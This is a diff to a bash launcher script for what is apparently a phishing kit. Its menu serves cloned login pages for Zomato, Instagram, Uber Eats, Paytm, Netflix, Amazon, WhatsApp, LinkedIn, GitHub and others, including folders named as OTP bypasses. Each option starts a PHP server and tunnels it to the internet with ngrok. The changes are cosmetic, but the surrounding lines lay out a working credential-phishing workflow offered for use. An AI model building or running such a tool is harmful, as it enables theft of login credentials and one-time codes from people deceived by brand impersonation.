@@ -4,7 +4,7 @@ echo ""
 echo ""
 echo ""
 printf "\e[1;33m[\e[0m <<>> \e[1;33m] NGROK SERVER : TURN ON MOBILE DATA & HOTSPOT AND GET START !\e[0m"
-sleep 8
+sleep 6
 echo ""
 clear
 echo ""
@@ -55,11 +55,11 @@ echo ""
                          1)cd sites/ 
                            cd Zomato-Phishing/
                            echo ""
-                           echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
+                           echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 3
                            echo ""
-                           echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
+                           echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
                            ./ngrok http 4444 > /dev/null 2>&1 &
                            sleep 25
                            echo ""
@@ -96,11 +96,11 @@ echo ""
                 3) cd sites/
                   cd instagram/
                   echo ""
-                  echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
+                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                   php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                   sleep 3
                   echo ""
-                  echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
+                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
                   ./ngrok http 4444 > /dev/null 2>&1 &
                   sleep 25
                   echo ""
@@ -119,11 +119,11 @@ echo ""
                 4)cd sites/
                   cd UberEats-Phishing/
                   echo ""
-                  echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
+                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                   php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                   sleep 3
                   echo ""
-                  echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
+                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
                   ./ngrok http 4444 > /dev/null 2>&1 &
                   sleep 25
                   echo ""
@@ -141,11 +141,11 @@ echo ""
                 5) cd sites/
                   cd ola-otpbypass/
                   echo ""
-                  echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
+                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                   php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                   sleep 3
                   echo ""
-                  echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
+                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
                   ./ngrok http 4444 > /dev/null 2>&1 &
                   sleep 25
                   echo ""
@@ -187,15 +187,15 @@ echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m 1 \e[0m\e[1;33m]\e[0m\e[1;32m Paytm Sign In \e[0m' 
                  echo -e $'\e[1;33m[\e[0m\e[1;77m 2 \e[0m\e[1;33m]\e[0m\e[1;32m Paytm Sign UP \e[0m' 
                  echo ""
-                 read -p $'\e[1;33m[\e[0m\e[1;77m + \e[0m\e[1;33m]\e[0m\e[1;32m Enter Your Choice : \e[0m' option
+                 read -p $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m Enter Your Choice : \e[0m' option
 		 case $option in
 			 1) cd paytm/
                             echo ""
-                            echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
+                            echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                             php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                             sleep 3
                             echo ""
-                            echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
+                            echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
                             ./ngrok http 4444 > /dev/null 2>&1 &
                             sleep 25
                             echo ""
@@ -231,11 +231,11 @@ echo ""
                 8)cd sites/
                   cd Netflix/
                   echo ""
-                  echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
+                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                   php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                   sleep 3
                   echo ""
-                  echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
+                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
                   ./ngrok http 4444 > /dev/null 2>&1 &
                   sleep 25
                   echo ""
@@ -272,11 +272,11 @@ echo ""
                10)cd sites/
                   cd amazonsign/
                   echo ""
-                  echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
+                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                   php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                   sleep 3
                   echo ""
-                  echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
+                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
                   ./ngrok http 4444 > /dev/null 2>&1 &
                   sleep 25
                   echo ""
@@ -291,11 +291,11 @@ echo ""
                 11)cd sites/
                   cd whatsapp-phishing/
                   echo ""
-                  echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
+                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                   php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                   sleep 3
                   echo ""
-                  echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
+                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
                   ./ngrok http 4444 > /dev/null 2>&1 &
                   sleep 25
                   echo ""
@@ -311,11 +311,11 @@ echo ""
                 12)cd sites/
                   cd Linkedin/
                   echo ""
-                  echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
+                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                   php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                   sleep 3
                   echo ""
-                  echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
+                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
                   ./ngrok http 4444 > /dev/null 2>&1 &
                   sleep 25
                   echo ""
@@ -331,11 +331,11 @@ echo ""
                 13)cd sites/
                   cd Hotstar-otp-bypass/
                   echo ""
-                  echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
+                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                   php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                   sleep 3
                   echo ""
-                  echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
+                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
                   ./ngrok http 4444 > /dev/null 2>&1 &
                   sleep 25
                   echo ""
@@ -371,11 +371,11 @@ echo ""
                 15)cd sites/
                   cd github/
                   echo ""
-                  echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
+                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                   php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                   sleep 3
                   echo ""
-                  echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
+                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
                   ./ngrok http 4444 > /dev/null 2>&1 &
                   sleep 25
                   echo ""
@@ -391,11 +391,11 @@ echo ""
                 16)cd sites/
                    cd ipfinder/
                    echo ""
-                  echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
+                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                   php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                   sleep 3
                   echo ""
-                  echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
+                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
                   ./ngrok http 4444 > /dev/null 2>&1 &
                   sleep 25
                   echo ""
